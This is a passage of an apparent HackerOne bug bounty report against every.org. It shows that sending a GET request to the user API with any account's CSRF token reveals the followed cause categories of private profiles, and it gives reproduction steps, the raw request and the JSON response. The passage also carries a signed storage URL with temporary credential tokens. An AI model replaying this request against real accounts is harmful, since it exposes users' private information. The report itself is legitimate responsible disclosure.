On https://www.every.org/settings/profile page, submit the form by clicking on \"Update\" button and get the send request with all csrf and cookie headers\n  2. The first line will be **PATCH /api/me HTTP/1.1**, simply modify this to **GET /api/users/any_username** and re-send the request (you do not need to keep the body json data)\n  3. Read the API Json response, especially the `\"causes\":[{\"entityName\":\"Cause Follow\",\"causeCategory\":\"SOME_CATEGORY\"}]` part\n\n## Example:\n\nI have two accounts :\nhttps://www.every.org/@bug.hunter (ech0bh+everyorg@wearehackerone.com) - \"Attacker\"\nhttps://www.every.org/@bug.hunter3 (ech0bh+everyorg3@wearehackerone.com) - PRIVATE profile\n\nThis is **bug.hunter3** private profile, interested in \"Education\" cause :\n\n{F755510}\n\nThis is an API GET request sent with **bug.hunter** account CSRF-Token (no cookie needed) :\n\n```\nGET /api/users/bug.hunter3 HTTP/1.1\nHost: www.every.org\nUser-Agent: Mozilla/5.0 (---------------------------------) Gecko/20100101 Firefox/74.0\nAccept: */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://www.every.org/settings/profile\nContent-Type: application/json\nX-CSRF-Token: \u003ccsrf_token_here\u003e\nOrigin: https://www.every.org\nContent-Length: 0\nConnection: close\nCookie: \n```\n\nThis is the reponse body :\n\n```\n{\n  \"message\": \"Found user\",\n  \"data\": {\n    \"user\": {\n      \"entityName\": \"User\",\n      \"id\": \"e03bb4c9-c904-46d5-92db-59b235743690\",\n      \"firstName\": \"bug\",\n      \"lastName\": \"hunter3\",\n      \"profileImageUrl\": \"\",\n      \"username\": \"bug.hunter3\",\n      \"locationAddress\": \"\",\n      \"isPrivate\": true,\n      \"followedByCurrentUserStatus\": \"none\",\n      \"followingCurrentUserStatus\": \"none\",\n      \"causes\": [\n        {\n          \"entityName\": \"Cause Follow\",\n          \"causeCategory\": \"EDUCATION\"\n        }\n      ]\n    },\n    \"followInfo\": {\n      \"entityName\": \"Follow Info\",\n      \"userId\": \"e03bb4c9-c904-46d5-92db-59b235743690\",\n      \"followerCount\": 0,\n      \"followingCount\": 0\n    }\n  }\n}\n```\n\nAs we can see, I was able to know that bug.hunter3 is interested in \"Education\" cause, even though it is a private profile and I am not following it.\n\n## Additional information:\n\nPlease note that bug.hunter2 (ech0bh+everyorg2@wearehackerone.com) is also my account which wasn't of any use here. I created it to test another vulnerability.\n\nPS: The link reference in top of this submit page does not redirect to your security page. Indeed, there is a link to https://hackerone.com/every_org while your security page is https://hackerone.com/everydotorg.\n\nDo not hesitate to ask any information you would need and I'll be happy to help.\n\n## Impact\n\nFollowing cause category information disclosure of any account (even private account that we do not follow).","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":755510,"file_name":"causes.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DBRLrA8FvN3mx64tQn1C8hWX?response-content-disposition=attachment%3B%20filename%3D%22causes.png%22%3B%20filename%2A%3DUTF-8%27%27causes.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153220Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=690f3fe8882404fe06858dc1b88c6c1c7cc63b0cb70a5435e7fab8dce3445898","file_size":148757,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["what_web","ech0fr","sl33pyp0t4t0","1trick","rcl"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":42365,"asset_type":"URL","asset_identifier":"staging.every.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7387245,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"","automated_response":false,"created_at":"2020-03-21T21:11:03.648Z","updated_at":"2020-03-21T21:11:03.648Z","actor":{"username":"ech0fr","cleared":false,"url":"/ech0fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/de9wZnoBSA1TAbGKV31uiB7x/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stagingdoteverydotorg","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7414245,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","automated_response":false,"created_at":"2020-03-24T18:44:33.174Z","updated_at":"2020-03-24T18:44:33.174Z","actor":{"username":"ech0fr","cleared":false,"url":"/ech0fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/de9wZnoBSA1TAbGKV31uiB7x/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stagingdoteverydotorg","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7414246,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If possible, I would like to re-open this report.
